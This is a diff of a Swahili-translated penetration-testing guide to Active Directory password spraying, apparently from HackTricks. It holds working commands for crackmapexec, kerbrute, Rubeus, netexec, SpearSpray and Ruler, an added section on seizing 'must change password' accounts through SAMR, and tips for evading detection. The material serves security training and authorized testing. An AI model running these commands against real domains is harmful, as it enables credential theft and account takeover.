@@ -5,16 +5,16 @@
 
 ## **Password Spraying**
 
-Mara tu unapopata **valid usernames** kadhaa unaweza kujaribu **common passwords** zinazotumika zaidi (kumbuka password policy ya mazingira) kwa kila mtumiaji uliyegundua.\
+Mara unapopata kadhaa za **valid usernames**, unaweza kujaribu **common passwords** (kumbuka password policy ya mazingira)\
 Kwa chaguo-msingi, **minimum** **password** **length** ni **7**.
 
-Orodha za common usernames zinaweza pia kuwa muhimu: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+Orodha za **common usernames** pia zinaweza kuwa muhimu: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Kumbuka kwamba unaweza **could lockout some accounts if you try several wrong passwords** (kwa chaguo-msingi zaidi ya 10).
+Kumbuka kwamba unaweza lockout baadhi ya accounts ikiwa utajaribu several wrong passwords (kwa chaguo-msingi zaidi ya 10).
 
 ### Pata password policy
 
-Ikiwa una user credentials au shell kama domain user unaweza **get the password policy with**:
+Ikiwa una some user credentials au shell kama domain user unaweza kupata password policy kwa:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -47,16 +47,16 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-- [**spray**](https://github.com/Greenwolf/Spray) _**(unaweza kubainisha idadi ya jaribio ili kuepuka lockouts):**_
+- [**spray**](https://github.com/Greenwolf/Spray) _**(unaweza kubainisha idadi ya jaribio ili kuepuka kufungiwa):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-- Kutumia [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - HAIPENDEKEZWI, WAKATI MENGINE HAIFANYI KAZI
+- Kutumia [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - HAIPENDEKEZWI; WAKATI MWINGINE HAIFANYI KAZI
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-- Kwa kutumia moduli ya `scanner/smb/smb_login` ya **Metasploit**:
+- Kwa moduli ya `scanner/smb/smb_login` ya **Metasploit**:
 
 ![](<../../images/image (745).png>)
 
@@ -67,9 +67,9 @@ for u in $(cat users.txt); do
 rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
 done
 ```
-#### Kutoka Windows
+#### Kutoka kwa Windows
 
-- Na [Rubeus](https://github.com/Zer1t0/Rubeus) toleo lenye brute module:
+- Kwa [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -77,31 +77,63 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- Kwa kutumia [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Inaweza kuunda watumiaji kutoka kwa domain kwa chaguo-msingi na itapata sera ya nywila kutoka kwa domain na kuweka kikomo kwa majaribio kulingana nayo):
+- Kwa [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Inaweza kuunda watumiaji kutoka kwenye domain kwa chaguo-msingi na itapata sera ya nywila kutoka kwenye domain na itaweka kikomo kwa idadi ya majaribio kulingana nayo):
 ```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-- Kwa kutumia [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
+- Kwa [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
 ```
 Invoke-SprayEmptyPassword
 ```
+### Tambua na Uchukue Udhibiti wa Akaunti "Password must change at next logon" (SAMR)
+
+Mbinu ya kimyakimya ni spray password isiyo hatari/tupu na kushika akaunti zinazorudisha STATUS_PASSWORD_MUST_CHANGE, ambayo inaonyesha kuwa password iliexpire kwa nguvu na inaweza kubadilishwa bila kujua ile ya zamani.
+
+Mchakato:
+- Orodhesha watumiaji (RID brute via SAMR) ili kujenga orodha ya malengo:
+
+{{#ref}}
+../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
+{{#endref}}
+```bash
+# NetExec (null/guest) + RID brute to harvest users
+netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
+```
+- Spray password tupu na endelea kwenye hits ili kunyakua accounts ambazo zinapaswa kubadilishwa wakati wa next logon:
+```bash
+# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
+netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
+```
+- Kwa kila hit, badilisha password kupitia SAMR kwa module ya NetExec (hakuna old password inahitajika wakati "must change" imewekwa):
+```bash
+# Strong complexity to satisfy policy
+env NEWPASS='P@ssw0rd!2025#' ; \
+netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
+
+# Validate and retrieve domain password policy with the new creds
+netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
+```
+Vidokezo vya operesheni:
+- Hakikisha saa ya host yako iko sawa na saa ya DC kabla ya operesheni zinazotegemea Kerberos: `sudo ntpdate <dc_fqdn>`.
+- [+] bila (Pwn3d!) katika baadhi ya modules (kwa mfano, RDP/WinRM) ina maana creds ni sahihi lakini akaunti haina interactive logon rights.
+
 ## Brute Force
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
 ### Kerberos pre-auth spraying na LDAP targeting na PSO-aware throttling (SpearSpray)
 
-Kerberos pre-auth–based spraying hupunguza kelele ikilinganishwa na majaribio ya kuunga SMB/NTLM/LDAP na inalingana vizuri zaidi na sera za kufunga akaunti za AD. SpearSpray inachanganya LDAP-driven targeting, injini ya pattern, na ufahamu wa sera (domain policy + PSOs + badPwdCount buffer) ili kuspray kwa usahihi na kwa usalama. Pia inaweza kuweka lebo kwa principals walioathiriwa kwenye Neo4j kwa ajili ya BloodHound pathing.
+Kerberos pre-auth–based spraying inapunguza kelele ikilinganishwa na SMB/NTLM/LDAP bind attempts na inaendana vizuri zaidi na AD lockout policies. SpearSpray inaunganisha LDAP-driven targeting, injini ya pattern, na uelewa wa sera (domain policy + PSOs + badPwdCount buffer) ili kuspray kwa usahihi na kwa usalama. Inaweza pia ku-tag compromised principals katika Neo4j kwa BloodHound pathing.
 
 Mawazo muhimu:
-- Ugundaji wa watumiaji kupitia LDAP na paging na msaada wa LDAPS, kwa hiari kutumia vichujio vya LDAP vilivyobinafsishwa.
-- Sera ya kufunga akaunti ya domain + kuchuja kwa kuzingatia PSO ili kuacha buffer ya majaribio inayoweza kusanidiwa (threshold) na kuepuka kufunga watumiaji.
-- Thibitisho la Kerberos pre-auth likitumia fast gssapi bindings (huunda 4768/4771 kwenye DCs badala ya 4625).
-- Uundaji wa nywila unaotegemea pattern, kwa kila mtumiaji kwa kutumia vigezo kama majina na thamani za muda zinazotokana na pwdLastSet ya kila mtumiaji.
-- Udhibiti wa throughput kwa kutumia threads, jitter, na max requests per second.
-- Uunganishaji wa hiari na Neo4j kuorodhesha watumiaji waliotekwa kwa BloodHound.
+- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
+- Domain lockout policy + PSO-aware filtering ili kuacha buffer ya jaribio inayoweza kusanidiwa (kizingiti) na kuepuka kufunga watumiaji.
+- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
+- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
+- Throughput control with threads, jitter, and max requests per second.
+- Optional Neo4j integration to mark owned users for BloodHound.
 
-Matumizi ya msingi na ugundaji:
+Matumizi ya msingi na ugunduzi:
 ```bash
 # List available pattern variables
 spearspray -l
@@ -112,7 +144,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # LDAPS (TCP/636)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
 ```
-Kulenga na udhibiti wa mtindo:
+Kulenga na udhibiti wa muundo:
 ```bash
 # Custom LDAP filter (e.g., target specific OU/attributes)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
@@ -121,7 +153,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
 ```
-Udhibiti wa kuficha na usalama:
+Vidhibiti vya kujificha na usalama:
 ```bash
 # Control concurrency, add jitter, and cap request rate
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10
@@ -129,7 +161,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # Leave N attempts in reserve before lockout (default threshold: 2)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
 ```
-Kuongeza taarifa kwa Neo4j/BloodHound:
+Neo4j/BloodHound uboreshaji wa data:
 ```bash
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
 ```
@@ -142,29 +174,29 @@ Muhtasari wa mfumo wa pattern (patterns.txt):
 {samaccountname}
 {extra}{separator}{year}{suffix}
 ```
-Vigezo vinavyopatikana ni pamoja na:
+Available variables include:
 - {name}, {samaccountname}
-- Muda kutoka kwa pwdLastSet ya kila mtumiaji (au whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
-- Msaidizi wa muundo na tokeni ya shirika: {separator}, {suffix}, {extra}
+- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
+- Composition helpers and org token: {separator}, {suffix}, {extra}
 
-Vidokezo vya uendeshaji:
-- Pendelea kuchunguza PDC-emulator kwa kutumia -dc ili kusoma badPwdCount na taarifa zinazohusiana na sera zilizo na mamlaka zaidi.
-- Urejeshaji wa badPwdCount unachochewa kwenye jaribio lijalo baada ya dirisha la uchunguzi; tumia kikomo na upangaji wa muda ili kukaa salama.
-- Jaribio za Kerberos pre-auth zinaonekana kama 4768/4771 katika DC telemetry; tumia jitter na rate-limiting ili kujichanganya.
+Operational notes:
+- Pendelea kuuliza PDC-emulator kwa -dc ili kusoma badPwdCount yenye uhalali zaidi na taarifa zinazohusiana na sera.
+- Urejeshaji wa badPwdCount unasababishwa kwenye jaribio lijalo baada ya dirisha la uchunguzi; tumia threshold na timing ili kuwa salama.
+- Majaribio ya Kerberos pre-auth yanaonekana kama 4768/4771 katika DC telemetry; tumia jitter na rate-limiting ili kujizungusha.
 
-> Vidokezo: Vipimo vya ukurasa wa LDAP vya chaguo-msingi vya SpearSpray ni 200; rekebisha kwa -lps inapobidi.
+> Kidokezo: SpearSpray’s default LDAP page size is 200; rekebisha na -lps inapohitajika.
 
 ## Outlook Web Access
 
-Kuna zana kadhaa za p**assword spraying outlook**.
+There are multiples tools for p**assword spraying outlook**.
 
-- Kwa [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
-- kwa [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
-- Kwa [Ruler](https://github.com/sensepost/ruler) (inayotegemewa!)
-- Kwa [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
-- Kwa [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
+- Kwa kutumia [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
+- Kwa kutumia [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
+- Kwa kutumia [Ruler](https://github.com/sensepost/ruler) (inayotegemewa!)
+- Kwa kutumia [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
+- Kwa kutumia [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-Ili kutumia mojawapo ya zana hizi, unahitaji orodha ya watumiaji na password / orodha ndogo ya passwords to spray.
+Ili kutumia yoyote ya zana hizi, unahitaji orodha ya watumiaji na password / orodha ndogo ya passwords za spray.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -183,7 +215,7 @@ Ili kutumia mojawapo ya zana hizi, unahitaji orodha ya watumiaji na password / o
 - [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
 - [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)
 
-## Marejeleo
+## Marejeo
 
 - [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
 - [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
@@ -194,6 +226,7 @@ Ili kutumia mojawapo ya zana hizi, unahitaji orodha ya watumiaji na password / o
 - [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 - [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
+- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
 
 
 {{#include ../../banners/hacktricks-training.md}}
